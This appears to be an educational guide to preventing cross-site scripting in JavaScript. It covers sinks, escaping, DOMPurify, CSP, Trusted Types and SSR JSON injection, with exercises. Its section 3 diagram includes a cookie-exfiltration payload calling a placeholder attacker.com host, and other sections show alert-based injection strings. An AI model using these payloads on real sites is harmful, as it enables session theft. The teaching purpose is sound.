# Cross-Site Scripting (XSS) Prevention in JavaScript

> Stored, Reflected, and DOM-based XSS, dangerous execution sinks, Context-Aware Escaping, Content Security Policy (CSP), and Trusted Types.

| Metadata | Details |
| :--- | :--- |
| **Level** | Advanced |
| **Prerequisites** | [DOM Fundamentals](file:///e:/Learning/engineering-notes/01-languages/javascript/14_dom-and-browser/01_dom.md), [Element Manipulation](file:///e:/Learning/engineering-notes/01-languages/javascript/14_dom-and-browser/03_element-manipulation.md) |
| **Time to read** | 25 minutes |
| **Status** | Complete |
| **Standard / Runtime** | W3C Trusted Types, OWASP Top 10, Modern Evergreen Browsers |

---

## Table of Contents
1. [What & Why](#1-what--why)
2. [Core Concepts](#2-core-concepts)
3. [How It Works Internally](#3-how-it-works-internally)
4. [Syntax & API Reference](#4-syntax--api-reference)
5. [Practical Examples](#5-practical-examples)
6. [Edge Cases, Pitfalls & Gotchas](#6-edge-cases-pitfalls--gotchas)
7. [Common Mistakes & Anti-Patterns](#7-common-mistakes--anti-patterns)
8. [Performance Characteristics](#8-performance-characteristics)
9. [Engine Internals](#9-engine-internals)
10. [Best Practices & Design Guidelines](#10-best-practices--design-guidelines)
11. [Real-World Case Study](#11-real-world-case-study)
12. [Interview Questions](#12-interview-questions)
13. [Exercises & Challenges](#13-exercises--challenges)

---

## 1. What & Why

**Cross-Site Scripting (XSS)** remains one of the most prevalent and devastating vulnerabilities in web applications (consistently ranked in the OWASP Top 10). XSS occurs when an application receives untrusted data and includes it in a web page without proper validation or escaping, causing the user's browser to execute the attacker's string as native JavaScript within the victim's origin context.

Once malicious JavaScript executes within an origin, the attacker inherits the full security authority of the authenticated user:
- Session hijacking (reading un-protected cookies or tokens stored in `localStorage`).
- Keystroke logging and credential harvesting.
- Forging unauthorized API requests on behalf of the victim.
- Defacing the user interface or redirecting users to phishing portals.

Eliminating XSS requires understanding how browser HTML parsers interpret context, identifying dangerous injection sinks, enforcing **Context-Aware Escaping**, utilizing **DOMPurify**, and deploying browser-enforced mitigations like **Content Security Policy (CSP)** and **Trusted Types**.

---

## 2. Core Concepts

### The Three Classifications of XSS
1. **Stored (Persistent) XSS**: The attacker's malicious script payload is stored permanently on the server (e.g. database comment, forum post, user profile display name). When other users load the page, the payload is retrieved from the server and executed in their browsers.
2. **Reflected (Non-Persistent) XSS**: The payload is reflected off the web server directly in an immediate HTTP response (e.g. search query parameters, error messages). The attacker tricks the victim into clicking a malicious link (`https://example.com/search?q=<script>...`).
3. **DOM-Based XSS**: The vulnerability exists entirely in client-side JavaScript. The server is not involved; client code reads untrusted data from a **Source** (like `location.search`, `location.hash`, or `window.name`) and unsafely writes it to an execution **Sink** (like `element.innerHTML` or `eval()`).

### Sources and Sinks
- **Sources**: Browser inputs that can be influenced by attackers (`location.search`, `location.hash`, `document.referrer`, `postMessage` payloads, WebSocket messages, unvalidated API JSON).
- **Dangerous Sinks**: APIs that parse strings into executable code or markup:
  - HTML Sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`.
  - Execution Sinks: `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`.
  - Navigation Sinks: `location.href`, `location.assign()`, `window.open()`, `<a href="javascript:...">`.

---

## 3. How It Works Internally

```
DOM-BASED XSS INJECTION LIFECYCLE:

Attacker Crafts URL:
https://example.com/welcome#<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>
                                   |
                                   | User clicks link & browser loads page
                                   v
+--------------------------------------------------------------------------+
| CLIENT JAVASCRIPT EXECUTION                                              |
| const hash = location.hash.slice(1);                                     |
| document.getElementById('hero').innerHTML = `Welcome ${hash}`;           |
+------------------------------------+-------------------------------------+
                                     |
                                     | Passes unescaped HTML to DOM Parser
                                     v
+--------------------------------------------------------------------------+
| BROWSER HTML PARSER (Blink / WebKit)                                     |
| 1. Parses <img src=x onerror=...> into DOM element                       |
| 2. Attempts to load image from 'x' -> Fails with HTTP 404                |
| 3. Fires 'onerror' attribute -> Executes injected JavaScript!            |
| 4. Injected script sends victim's session tokens to attacker's server   |
+--------------------------------------------------------------------------+
```

---

## 4. Syntax & API Reference

### Safe DOM Manipulation vs Dangerous Sinks
```javascript
// DANGEROUS: Sinks that evaluate HTML strings
element.innerHTML = userInput; // VULNERABLE TO XSS!
element.insertAdjacentHTML('beforeend', userInput); // VULNERABLE!
eval(userInput); // VULNERABLE!
element.href = `javascript:${userInput}`; // VULNERABLE!

// SAFE: Native text node insertion (Never parsed as HTML markup)
element.textContent = userInput; // 100% SAFE
element.innerText = userInput;   // SAFE

// SAFE: Programmatic DOM element creation
const span = document.createElement('span');
span.textContent = userInput;
element.appendChild(span);
```

### Context-Aware HTML Entity Escaping Function
```javascript
export function escapeHtml(str) {
  if (typeof str !== 'string') return '';
  return str.replace(/[&<>"']/g, (char) => {
    switch (char) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      case "'": return '&#39;';
      default: return char;
    }
  });
}
```

---

## 5. Practical Examples

### Example 1: Sanitizing User-Provided Rich Text with DOMPurify
```javascript
// When applications MUST render HTML formatted text (e.g. blog editors, rich comments),
// never roll your own regex sanitizer. Use DOMPurify:
import DOMPurify from 'dompurify';

function renderUserComment(commentHtml, containerElement) {
  // DOMPurify removes malicious scripts, invalid protocols, and rogue event handlers
  const cleanHtml = DOMPurify.sanitize(commentHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'target'],
  });

  // Safe to assign sanitized output
  containerElement.innerHTML = cleanHtml;
}
```

### Example 2: Preventing JavaScript URL Protocol Sinks
```javascript
// DANGEROUS: An attacker provides "javascript:alert(document.cookie)"
function badSetProfileLink(userProvidedUrl) {
  const link = document.createElement('a');
  link.href = userProvidedUrl; // VULNERABLE TO JAVASCRIPT: PROTOCOL!
  link.textContent = 'Visit User Website';
  document.body.appendChild(link);
}

// SECURE: Enforce safe protocols (http/https only)
function safeSetProfileLink(userProvidedUrl) {
  const link = document.createElement('a');

  try {
    const parsed = new URL(userProvidedUrl, window.location.origin);
    // Whitelist allowed protocols
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
      link.href = parsed.href;
      link.textContent = 'Visit User Website';
      link.rel = 'noopener noreferrer'; // Defense against tab-nabbing
      document.body.appendChild(link);
    } else {
      console.warn('Blocked dangerous URL protocol:', parsed.protocol);
    }
  } catch (err) {
    console.error('Invalid URL provided');
  }
}
```

### Example 3: Tagged Template Literal Auto-Escaper
```javascript
// Tagged template function that automatically escapes interpolated expressions
export function safeHtml(strings, ...values) {
  let output = strings[0];

  for (let i = 0; i < values.length; i++) {
    const val = values[i];
    // Auto-escape injected values while preserving raw template strings
    output += escapeHtml(String(val ?? ''));
    output += strings[i + 1];
  }

  return output;
}

// Usage:
const maliciousInput = '<script>alert(1)</script>';
const markup = safeHtml`<div class="user-card">Welcome, ${maliciousInput}!</div>`;
// Output: <div class="user-card">Welcome, &lt;script&gt;alert(1)&lt;/script&gt;!</div>
```

### Example 4: Enforcing Trusted Types (W3C Standard)
```javascript
// Enabling Trusted Types forces the browser to block raw string assignments to sinks!
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  // Define an application security policy
  const sanitizePolicy = trustedTypes.createPolicy('myAppSanitizer', {
    createHTML: (string) => DOMPurify.sanitize(string),
  });

  // Attempting `element.innerHTML = rawString` now THROWS A TYPE ERROR in the browser!
  // Developers are forced to pass a TrustedHTML object:
  const dirty = '<img src=x onerror=alert(1)>';
  const trustedHtml = sanitizePolicy.createHTML(dirty);

  document.getElementById('content').innerHTML = trustedHtml; // Allowed!
}
```

### Example 5: Strict Content Security Policy (CSP) Configuration
```http
# Server HTTP Response Header:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script';
```
*Effect*:
- Inline scripts `<script>alert(1)</script>` are blocked completely by the browser unless they carry the exact cryptographic matching `nonce="rAnd0m123"`.
- All `javascript:` URLs are disabled.
- Untrusted third-party domains cannot load executable scripts.

---

## 6. Edge Cases, Pitfalls & Gotchas

1. **Context-Dependent Escaping**: Escaping HTML entities (`&lt;` for `<`) only protects against HTML body injection (`<div>${escaped}</div>`). It does **not** protect against attribute injection (`<input value="${userInput}">`), JavaScript execution blocks (`<script>var x = '${userInput}';</script>`), or URL sinks (`<a href="${userInput}">`). Each context requires specialized encoding (e.g. URI encoding, JSON encoding, or attribute quoting).
2. **Double Escaping**: Passing already-escaped text through `escapeHtml()` twice converts `&lt;` into `&amp;lt;`, causing ugly visual corruption in user interfaces.
3. **JSON Injection in Server-Side Rendering (SSR)**: Emitting JSON into HTML script tags (`<script>window.__PRELOADED_STATE__ = ${JSON.stringify(state)}</script>`) is vulnerable if `state` contains `</script><script>alert(1)`. Standard `JSON.stringify` does not escape `</script>`. Always replace `<` with `\u003c` in serialized JSON blocks.
4. **Markdown Parsers**: Markdown libraries (like `marked` or `markdown-it`) compile markdown into raw HTML. By default, raw HTML tags embedded in markdown are rendered into the output. Always pass markdown HTML through DOMPurify before inserting it into the DOM.

---

## 7. Common Mistakes & Anti-Patterns

| Anti-Pattern | Why It Breaks | Correct Pattern |
| :--- | :--- | :--- |
| `element.innerHTML = userText` | Parses input as HTML markup, enabling script execution | Use `element.textContent = userText` |
| Using custom Regex to sanitize HTML tags | Attackers easily bypass regex with malformed tags (`<img/src=x/onerror=...>`) | Use battle-tested sanitizers (`DOMPurify`) |
| Embedding raw JSON in `<script>` tags in SSR | `</script>` tags close the script block early, injecting script | Replace `<` with `\u003c` or use Base64 encoding |
| `a.href = userUrl` without protocol validation | Allows `javascript:alert(1)` pseudo-protocol execution | Validate that protocol is strictly `http:` or `https:` |
| Relying on `CSP` without `object-src 'none'` | Flash or plugin exploits can bypass script policies | Enforce comprehensive strict CSP headers |
| Disabling React's protection via `dangerouslySetInnerHTML` | Bypasses virtual DOM auto-escaping | Sanitize with DOMPurify before setting |

---

## 8. Performance Characteristics

- **`textContent` vs `innerHTML`**: Assigning to `textContent` is up to 5x faster than `innerHTML` because the browser completely bypasses the complex HTML parsing engine and tokenizer.
- **DOMPurify Sanitization**: Sanitizing a typical 10 KB rich text payload takes $< 1\text{ms}$ in modern V8.

---

## 9. Engine Internals

1. **HTML Tokenization State Machine**:
   - The browser parses HTML using an 80+ state finite state machine defined in the HTML5 specification.
   - When encountering `<`, the tokenizer switches to Tag Open State. If attributes contain script-like event handlers (`onload`, `onerror`), the browser binds inline V8 JavaScript event listeners.
2. **Trusted Types Compilation Guards**:
   - Under `require-trusted-types-for 'script'`, the V8 DOM bindings check if the incoming argument to `innerHTML` has the internal `[TrustedHTML]` brand flag. If a primitive string is passed, the engine rejects the assignment with a `TypeError` before calling the parser.

---

## 10. Best Practices & Design Guidelines

- **Default to `textContent`**: Never use `innerHTML` unless you explicitly intend to render styled markup.
- **Always Sanitize with DOMPurify**: If rich HTML must be rendered, sanitize the markup immediately before DOM insertion.
- **Enforce Nonce-Based CSP**: Deploy strict HTTP headers requiring cryptographic nonces on all scripts.
- **Store Sensitive Tokens in `HttpOnly` Cookies**: Keep JWTs and session tokens in `HttpOnly; Secure; SameSite=Strict` cookies so that even if an XSS vulnerability occurs, the attacker's script cannot read authentication credentials via `document.cookie`.

---

## 11. Real-World Case Study

### Mitigating Redux Initial State SSR XSS Injection
```javascript
// THE VULNERABILITY:
// In an Express SSR app, a user named `Ada</script><script>alert(document.cookie)</script>`
// logged in. The server rendered:
// <script>window.__PRELOADED_STATE__ = ${JSON.stringify(userState)};</script>
// The browser stopped parsing the script tag at `</script>` and immediately executed the injected tag!

// THE FIX: Safe JSON Serializer for HTML Script Tags
export function serializeSafeJson(obj) {
  return JSON.stringify(obj)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/\//g, '\\u002f')
    .replace(/\u2028/g, '\\u2028') // Line separator
    .replace(/\u2029/g, '\\u2029'); // Paragraph separator
}

// In server-rendered HTML template:
const safeHtml = `
  <!DOCTYPE html>
  <html>
    <head>
      <script>
        window.__PRELOADED_STATE__ = ${serializeSafeJson(userState)};
      </script>
    </head>
    <body><div id="root"></div></body>
  </html>
`;
```

---

## 12. Interview Questions

<details>
<summary>1. What is the fundamental difference between Stored, Reflected, and DOM-based XSS?</summary>
- <b>Stored XSS</b>: The malicious payload is saved permanently in the application's database and rendered to other users later.
- <b>Reflected XSS</b>: The payload is sent in an HTTP request (like a query parameter) and reflected directly back in the immediate HTTP response body.
- <b>DOM-based XSS</b>: The vulnerability exists exclusively on the client side; the payload never hits the server. Client-side JavaScript reads untrusted data from a browser source (like <code>location.hash</code>) and injects it into a dangerous execution sink (like <code>innerHTML</code>).
</details>

<details>
<summary>2. Why does textContent prevent XSS while innerHTML enables it?</summary>
<code>textContent</code> instructs the browser to treat the assigned value strictly as raw character data; the browser creates a DOM Text Node without invoking the HTML parser. <code>innerHTML</code> invokes the browser's HTML parser, which tokenizes markup and executes any embedded script tags or inline event handlers (like <code>onerror</code>).
</details>

<details>
<summary>3. What is a "javascript:" pseudo-protocol injection and how do you prevent it?</summary>
When a user-controlled string is assigned to an <code>href</code> attribute on an anchor tag (<code><a href="${url}"></code>), an attacker can supply <code>javascript:alert(1)</code>. Clicking the link executes the JavaScript code. It is prevented by strictly validating that the URL's protocol is <code>http:</code> or <code>https:</code> using the native <code>new URL()</code> constructor.
</details>

<details>
<summary>4. How does Content Security Policy (CSP) mitigate XSS?</summary>
CSP is an HTTP response header that restricts where the browser can load scripts from and disallows dangerous execution patterns. A strict CSP disables inline scripts, blocks the <code>eval()</code> family of functions, and restricts external scripts exclusively to authorized domains or scripts bearing a valid cryptographic nonce.
</details>

<details>
<summary>5. What are Trusted Types and how do they eliminate DOM XSS?</summary>
Trusted Types is a W3C browser security feature enforced via CSP (<code>require-trusted-types-for 'script'</code>). It blocks raw strings from being passed to DOM injection sinks (<code>innerHTML</code>, <code>eval</code>, <code>script.src</code>), requiring developers to pass a sanitized <code>TrustedHTML</code> or <code>TrustedScript</code> object produced by a verified policy.
</details>

<details>
<summary>6. Why is HttpOnly cookie configuration an essential defense-in-depth against XSS?</summary>
Cookies marked with the <code>HttpOnly</code> attribute cannot be accessed by client-side JavaScript via <code>document.cookie</code>. Even if an attacker discovers an XSS vulnerability on the page, they cannot steal session cookies or auth tokens directly.
</details>

<details>
<summary>7. Why is custom regex sanitization for HTML tags considered an anti-pattern?</summary>
HTML syntax is notoriously complex, permitting irregular whitespace, missing quotes, unclosed tags, and obscure character encodings (e.g. <code><img/src=x/onerror=alert(1)></code>). Regular expressions cannot reliably parse context-free grammars like HTML, leading to easy bypasses. Always use a full DOM-tree sanitizer like DOMPurify.
</details>

<details>
<summary>8. How can JSON.stringify() lead to XSS during Server-Side Rendering (SSR)?</summary>
When state objects are serialized into an inline HTML <code><script>window.__STATE__ = ${JSON.stringify(state)}</script></code>, the browser HTML parser takes precedence over the JavaScript parser. If a string contains <code></script></code>, the browser terminates the script block immediately, allowing any following string content to be parsed and executed as HTML markup.
</details>

---

## 13. Exercises & Challenges

### Exercise 1: Build a Context-Aware Attribute Escaper
Implement an escaping utility `escapeHtmlAttribute(value)` that safely encodes user-controlled strings intended to be placed inside double-quoted HTML attributes (`<input value="${escaped}">`), neutralizing quote breakouts and control characters.

<details>
<summary>View Solution</summary>

```javascript
export function escapeHtmlAttribute(value) {
  if (value === null || value === undefined) return '';
  return String(value).replace(/["'&<>]/g, (char) => {
    switch (char) {
      case '"': return '&quot;';
      case "'": return '&#39;';
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      default: return char;
    }
  });
}

// Test:
const payload = '10" onfocus="alert(1)';
const safeAttr = escapeHtmlAttribute(payload);
// Produces: 10&quot; onfocus=&quot;alert(1) (Safe inside <input value="${safeAttr}">)
```
</details>

### Exercise 2: Safe URL Redirect Validator
Write a function `getSafeRedirectUrl(targetUrl, allowedHost)` that verifies an incoming URL is safe for redirection (`window.location.href = url`), rejecting `javascript:` schemes, data URIs, and open-redirects to arbitrary external domains.

<details>
<summary>View Solution</summary>

```javascript
export function getSafeRedirectUrl(targetUrl, allowedHost = 'myapp.com') {
  try {
    // Relative URLs (e.g. "/dashboard") are safe
    if (targetUrl.startsWith('/') && !targetUrl.startsWith('//')) {
      return targetUrl;
    }

    const parsed = new URL(targetUrl);
    // Protocol must be strictly http/https and host must match
    if ((parsed.protocol === 'http:' || parsed.protocol === 'https:') && parsed.hostname === allowedHost) {
      return parsed.href;
    }
  } catch (err) {
    // Malformed URL
  }

  // Fallback to safe default
  return '/home';
}
```
</details>
